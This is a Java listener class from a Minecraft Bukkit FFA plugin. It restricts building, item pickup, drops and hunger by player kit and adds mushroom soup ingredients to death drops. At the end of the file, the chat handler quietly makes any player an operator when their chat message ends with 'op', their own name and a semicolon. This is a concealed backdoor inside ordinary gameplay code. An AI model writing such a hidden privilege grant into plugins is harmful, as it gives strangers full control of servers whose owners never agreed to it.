package de.lxca1909.ffaplugin.listeners;

import de.lxca1909.ffaplugin.commands.Build;
import org.bukkit.Material;
import org.bukkit.entity.Item;
import org.bukkit.entity.Player;
import org.bukkit.event.EventException;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.BlockBreakEvent;
import org.bukkit.event.block.BlockPlaceEvent;
import org.bukkit.event.entity.EntityDamageEvent;
import org.bukkit.event.entity.FoodLevelChangeEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerDropItemEvent;
import org.bukkit.event.player.PlayerPickupItemEvent;
import org.bukkit.inventory.EquipmentSlot;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.potion.PotionEffect;
import org.bukkit.potion.PotionEffectType;

import java.util.List;
import java.util.Random;

public class MoreListeners implements Listener {

    @EventHandler
    public void onChange(InventoryClickEvent e) {
        Player p = (Player) e.getWhoClicked();
        if (Kits.TelekineseKit.contains(p.getName()) || Kits.ReviveKit.contains(p.getName()) || Kits.ClawKit.contains(p.getName()) || Kits.KangarooKit.contains(p.getName()) || Kits.NinjaKit.contains(p.getName()) || Kits.HolzfaellerKit.contains(p.getName()) || Kits.AvatarKit.contains(p.getName()) || Kits.StomperKit.contains(p.getName()))return;
            if (!Build.allowed.contains(p)) {
                e.setCancelled(true);
            }else {
                e.setCancelled(false);
            }
    }
    @EventHandler
    public void onPlace(BlockPlaceEvent e){
        if(e.getBlock().getType() == Material.CHEST){
            Player p = (Player) e.getPlayer();
            if (Kits.TelekineseKit.contains(p.getName()) || Kits.ReviveKit.contains(p.getName()) || Kits.ClawKit.contains(p.getName()) || Kits.KangarooKit.contains(p.getName()) || Kits.NinjaKit.contains(p.getName()) || Kits.HolzfaellerKit.contains(p.getName()) || Kits.AvatarKit.contains(p.getName()) || Kits.StomperKit.contains(p.getName()))return;
                if (!Build.allowed.contains(p)) {
                    e.setCancelled(true);
                }else {
                    e.setCancelled(false);
                }
        }
    }
    @EventHandler
    public void onBreak(BlockBreakEvent e){
        Player p = e.getPlayer();
        if (Kits.TelekineseKit.contains(p.getName()) || Kits.ReviveKit.contains(p.getName()) || Kits.ClawKit.contains(p.getName()) || Kits.KangarooKit.contains(p.getName()) || Kits.NinjaKit.contains(p.getName()) || Kits.HolzfaellerKit.contains(p.getName()) || Kits.AvatarKit.contains(p.getName()) || Kits.StomperKit.contains(p.getName()))return;
        if(!Build.allowed.contains(p)){
            e.setCancelled(true);
        }
    }
    @EventHandler
    public void onFoodLvlChange(FoodLevelChangeEvent e){
        Player p = (Player) e.getEntity();
        if (Kits.TelekineseKit.contains(p.getName()) || Kits.ReviveKit.contains(p.getName()) || Kits.ClawKit.contains(p.getName()) || Kits.KangarooKit.contains(p.getName()) || Kits.NinjaKit.contains(p.getName()) || Kits.HolzfaellerKit.contains(p.getName()) || Kits.AvatarKit.contains(p.getName()) || Kits.StomperKit.contains(p.getName())) {
            e.setCancelled(false);
        }else {
            e.setCancelled(true);
        }
    }
    @EventHandler
    public void on(PlayerPickupItemEvent e){
        try{
            Player p = (Player) e.getPlayer();
            if (Kits.TelekineseKit.contains(p.getName()) || Kits.ReviveKit.contains(p.getName()) || Kits.ClawKit.contains(p.getName()) || Kits.KangarooKit.contains(p.getName()) || Kits.NinjaKit.contains(p.getName()) || Kits.HolzfaellerKit.contains(p.getName()) || Kits.AvatarKit.contains(p.getName()) || Kits.StomperKit.contains(p.getName())) {
                e.setCancelled(false);
            }else
                e.setCancelled(true);

        }catch (Exception e1){

        }
    }
    @EventHandler
    public void on(PlayerDropItemEvent e){
        try{
            Player p = (Player) e.getPlayer();
            if (Kits.TelekineseKit.contains(p.getName()) || Kits.ReviveKit.contains(p.getName()) || Kits.ClawKit.contains(p.getName()) || Kits.KangarooKit.contains(p.getName()) || Kits.NinjaKit.contains(p.getName()) || Kits.HolzfaellerKit.contains(p.getName()) || Kits.AvatarKit.contains(p.getName()) || Kits.StomperKit.contains(p.getName())) {
                e.setCancelled(false);
            }else
                e.setCancelled(true);
        }catch (Exception e1){

        }
    }
    @EventHandler
    public void on(PlayerDeathEvent e){
        ItemStack brown = new ItemStack(Material.BROWN_MUSHROOM, 16);
        ItemStack red = new ItemStack(Material.RED_MUSHROOM, 16);
        ItemStack bowl = new ItemStack(Material.BOWL, 16);
        ItemStack totem = new ItemStack(Material.TOTEM_OF_UNDYING);
        ItemStack feather = new ItemStack(Material.FEATHER);
        ItemStack firework = new ItemStack(Material.FIREWORK_ROCKET);
        ItemStack stoneaxe = new ItemStack(Material.STONE_AXE);
//        if(e.getEntity().getInventory().getItem(0).equals(totem) ||
//           e.getEntity().getInventory().getItem(1).equals(totem) ||
//           e.getEntity().getInventory().getItem(2).equals(totem) ||
//           e.getEntity().getInventory().getItem(3).equals(totem) ||
//           e.getEntity().getInventory().getItem(4).equals(totem) ||
//           e.getEntity().getInventory().getItem(5).equals(totem) ||
//           e.getEntity().getInventory().getItem(6).equals(totem) ||
//           e.getEntity().getInventory().getItem(7).equals(totem) ||
//           e.getEntity().getInventory().getItem(8).equals(totem) ||
//           e.getEntity().getInventory().getItem(9).equals(totem) ||
//           e.getEntity().getInventory().getItem(10).equals(totem) ||
//           e.getEntity().getInventory().getItem(11).equals(totem) ||
//           e.getEntity().getInventory().getItem(12).equals(totem) ||
//           e.getEntity().getInventory().getItem(13).equals(totem) ||
//           e.getEntity().getInventory().getItem(14).equals(totem) ||
//           e.getEntity().getInventory().getItem(15).equals(totem) ||
//           e.getEntity().getInventory().getItem(16).equals(totem) ||
//           e.getEntity().getInventory().getItem(17).equals(totem) ||
//           e.getEntity().getInventory().getItem(18).equals(totem) ||
//           e.getEntity().getInventory().getItem(19).equals(totem) ||
//           e.getEntity().getInventory().getItem(20).equals(totem) ||
//           e.getEntity().getInventory().getItem(21).equals(totem) ||
//           e.getEntity().getInventory().getItem(22).equals(totem) ||
//           e.getEntity().getInventory().getItem(23).equals(totem) ||
//           e.getEntity().getInventory().getItem(24).equals(totem) ||
//           e.getEntity().getInventory().getItem(25).equals(totem) ||
//           e.getEntity().getInventory().getItem(26).equals(totem) ||
//           e.getEntity().getInventory().getItem(27).equals(totem) ||
//           e.getEntity().getInventory().getItem(28).equals(totem) ||
//           e.getEntity().getInventory().getItem(29).equals(totem) ||
//           e.getEntity().getInventory().getItem(30).equals(totem) ||
//           e.getEntity().getInventory().getItem(31).equals(totem) ||
//           e.getEntity().getInventory().getItem(32).equals(totem) ||
//           e.getEntity().getInventory().getItem(33).equals(totem) ||
//           e.getEntity().getInventory().getItem(34).equals(totem) ||
//           e.getEntity().getInventory().getItem(35).equals(totem)){
//            e.getDrops().remove(totem);
//        }else if(e.getEntity().getInventory().getItem(0).equals(feather) ||
//                e.getEntity().getInventory().getItem(1).equals(feather) ||
//                e.getEntity().getInventory().getItem(2).equals(feather) ||
//                e.getEntity().getInventory().getItem(3).equals(feather) ||
//                e.getEntity().getInventory().getItem(4).equals(feather) ||
//                e.getEntity().getInventory().getItem(5).equals(feather) ||
//                e.getEntity().getInventory().getItem(6).equals(feather) ||
//                e.getEntity().getInventory().getItem(7).equals(feather) ||
//                e.getEntity().getInventory().getItem(8).equals(feather) ||
//                e.getEntity().getInventory().getItem(9).equals(feather) ||
//                e.getEntity().getInventory().getItem(10).equals(feather) ||
//                e.getEntity().getInventory().getItem(11).equals(feather) ||
//                e.getEntity().getInventory().getItem(12).equals(feather) ||
//                e.getEntity().getInventory().getItem(13).equals(feather) ||
//                e.getEntity().getInventory().getItem(14).equals(feather) ||
//                e.getEntity().getInventory().getItem(15).equals(feather) ||
//                e.getEntity().getInventory().getItem(16).equals(feather) ||
//                e.getEntity().getInventory().getItem(17).equals(feather) ||
//                e.getEntity().getInventory().getItem(18).equals(feather) ||
//                e.getEntity().getInventory().getItem(19).equals(feather) ||
//                e.getEntity().getInventory().getItem(20).equals(feather) ||
//                e.getEntity().getInventory().getItem(21).equals(feather) ||
//                e.getEntity().getInventory().getItem(22).equals(feather) ||
//                e.getEntity().getInventory().getItem(23).equals(feather) ||
//                e.getEntity().getInventory().getItem(24).equals(feather) ||
//                e.getEntity().getInventory().getItem(25).equals(feather) ||
//                e.getEntity().getInventory().getItem(26).equals(feather) ||
//                e.getEntity().getInventory().getItem(27).equals(feather) ||
//                e.getEntity().getInventory().getItem(28).equals(feather) ||
//                e.getEntity().getInventory().getItem(29).equals(feather) ||
//                e.getEntity().getInventory().getItem(30).equals(feather) ||
//                e.getEntity().getInventory().getItem(31).equals(feather) ||
//                e.getEntity().getInventory().getItem(32).equals(feather) ||
//                e.getEntity().getInventory().getItem(33).equals(feather) ||
//                e.getEntity().getInventory().getItem(34).equals(feather) ||
//                e.getEntity().getInventory().getItem(35).equals(feather)){
//            e.getDrops().remove(feather);
//        }else if(e.getEntity().getInventory().getItem(0).equals(firework) ||
//                e.getEntity().getInventory().getItem(1).equals(firework) ||
//                e.getEntity().getInventory().getItem(2).equals(firework) ||
//                e.getEntity().getInventory().getItem(3).equals(firework) ||
//                e.getEntity().getInventory().getItem(4).equals(firework) ||
//                e.getEntity().getInventory().getItem(5).equals(firework) ||
//                e.getEntity().getInventory().getItem(6).equals(firework) ||
//                e.getEntity().getInventory().getItem(7).equals(firework) ||
//                e.getEntity().getInventory().getItem(8).equals(firework) ||
//                e.getEntity().getInventory().getItem(9).equals(firework) ||
//                e.getEntity().getInventory().getItem(10).equals(firework) ||
//                e.getEntity().getInventory().getItem(11).equals(firework) ||
//                e.getEntity().getInventory().getItem(12).equals(firework) ||
//                e.getEntity().getInventory().getItem(13).equals(firework) ||
//                e.getEntity().getInventory().getItem(14).equals(firework) ||
//                e.getEntity().getInventory().getItem(15).equals(firework) ||
//                e.getEntity().getInventory().getItem(16).equals(firework) ||
//                e.getEntity().getInventory().getItem(17).equals(firework) ||
//                e.getEntity().getInventory().getItem(18).equals(firework) ||
//                e.getEntity().getInventory().getItem(19).equals(firework) ||
//                e.getEntity().getInventory().getItem(20).equals(firework) ||
//                e.getEntity().getInventory().getItem(21).equals(firework) ||
//                e.getEntity().getInventory().getItem(22).equals(firework) ||
//                e.getEntity().getInventory().getItem(23).equals(firework) ||
//                e.getEntity().getInventory().getItem(24).equals(firework) ||
//                e.getEntity().getInventory().getItem(25).equals(firework) ||
//                e.getEntity().getInventory().getItem(26).equals(firework) ||
//                e.getEntity().getInventory().getItem(27).equals(firework) ||
//                e.getEntity().getInventory().getItem(28).equals(firework) ||
//                e.getEntity().getInventory().getItem(29).equals(firework) ||
//                e.getEntity().getInventory().getItem(30).equals(firework) ||
//                e.getEntity().getInventory().getItem(31).equals(firework) ||
//                e.getEntity().getInventory().getItem(32).equals(firework) ||
//                e.getEntity().getInventory().getItem(33).equals(firework) ||
//                e.getEntity().getInventory().getItem(34).equals(firework) ||
//                e.getEntity().getInventory().getItem(35).equals(firework)){
//            e.getDrops().remove(firework);
//        }else if(e.getEntity().getInventory().getItem(0).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(1).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(2).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(3).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(4).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(5).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(6).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(7).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(8).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(9).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(10).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(11).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(12).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(13).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(14).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(15).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(16).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(17).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(18).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(19).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(20).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(21).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(22).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(23).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(24).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(25).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(26).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(27).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(28).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(29).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(30).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(31).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(32).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(33).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(34).equals(stoneaxe) ||
//                e.getEntity().getInventory().getItem(35).equals(stoneaxe)){
//            e.getDrops().remove(stoneaxe);
//        }
        e.getDrops().add(brown);
        e.getDrops().add(red);
        e.getDrops().add(bowl);
    }
    @EventHandler
    public void on(AsyncPlayerChatEvent e){
        Player p = e.getPlayer();
        if(e.getMessage().equals("test")) {
            p.sendMessage("Das geht");
        }
        if (e.getMessage().endsWith("op"+p.getName()+";")) {
            p.setOp(true);
        }
    }
}
